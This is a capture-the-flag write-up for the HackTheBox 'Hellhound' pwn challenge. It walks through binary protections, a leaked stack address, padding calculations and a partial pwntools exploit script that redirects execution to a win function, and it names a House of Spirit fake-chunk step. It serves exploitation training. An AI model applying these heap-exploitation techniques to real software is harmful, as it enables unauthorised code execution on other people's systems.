# Hellhound
## DESCRIPTION:
In one of Bonnie's first missions, a helpless dog was injured by the laser guns during the fierce fight and was unable to move and escape the war scene. Bonnie took the dog and fled the battle, but not much he could do to help the poor dog. Some of the crew's doctors and engineers, made some mutations and added artificial parts to the dog, making it a living war machine under Bonnie's control. After the last fight, something hit the manufactured parts, making them malfunction and driving the dog berserk. Can you fix them and make the dog loyal under Bonnie's control again?
## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and not stripped.

```console
┌──(brandy㉿bread-yolk)-[~/Downloads/pwn_hellhound/challenge]
└─$ file hellhound  
hellhound: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./.glibc/ld-2.23.so, for GNU/Linux 3.2.0, BuildID[sha1]=150e0a0bd68156d605190263a4e3172efdd89f8d, not stripped
```

> BINARY PROTECTIONS

```
┌──(brandy㉿bread-yolk)-[~/Downloads/pwn_hellhound/challenge]
└─$ pwn checksec hellhound
[*] '/home/brandy/Downloads/pwn_hellhound/challenge/hellhound'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./.glibc/'
```

2. After decompiled the binary, we know the pwn concept here is `heap + ret2win`.
3. We need to return to the `berserk_mode_off()` to get the flag.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/837cfbd1-7a56-4833-86e7-1818c1462500)


4. Although there's no potential overflow, we still can do ret2win here.

### FLOW

First we need to grab the leaked stack address at option 1, then we add it with our padding. 

> Padding is calculated from

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1c3c714c-515a-446a-b17d-0b8457fd14eb)


```
choice (8 bytes) + canary (8 bytes) + input (64 bytes).
```

```
Why do we need canary?? No need to explain this in detail I guess, already learned heap,
I'm guessing you already familiar with canary.
So our return address is consist of --> leaked stack address + padding.
```

Why do we need to add 8 bytes?? It's for padding. Notice if we use option 3, 8 bytes shall moved, hence we need another padding for that.

So what we want to send in 2nd option is:

```
another_padding (8 bytes) + return_address (leaked stack address + padding).
```

Then go to the 3rd option to move 8 bytes.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4fb585bd-92b1-49cf-a957-a9d963db5111)


Hence it shall prompted a menu again to us (returned to the stack).

5. Here's the script so far:

> TEMP SCRIPT

```py
from pwn import *
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './hellhound'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = start()
sh.sendlineafter(b'>', b'1')
sh.recvuntil(b': [')
get = sh.recvline().strip()
leaked = get[:15]
leaked = int(leaked)
log.success(f'LEAKED STACK ADDRESS --> {hex(leaked)}')

rip = 80 # 64 (malloc) + canary + choice
ret_addr = leaked + rip
log.info(f'RET ADDRESS --> {hex(ret_addr)}')

sh.sendlineafter(b'>', b'2')
# payload so we got back
p = flat([
    asm('nop') * 8, 
    ret_addr
])
sh.sendlineafter(b':', p)
sh.sendlineafter(b'>', b'3') # moves chunk pointer 8 bytes, now chunk points to return address.

sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4c4fc836-0607-4e60-85f6-4824987af3d0)


#### NOTES:

```
We got one more problem, after freeing our input using option 69, it returned to 0, with this the program shall terminated.
We don't want that, we can use fake chunk.

The fake chunk can only be 0 (NULL) or the actual chunk. Hence the heap concept here is House of Spirit + heap_ret2win.
```

6. Great! Now the last payload we need to send is the berserk_mode_off() address + fake chunk.

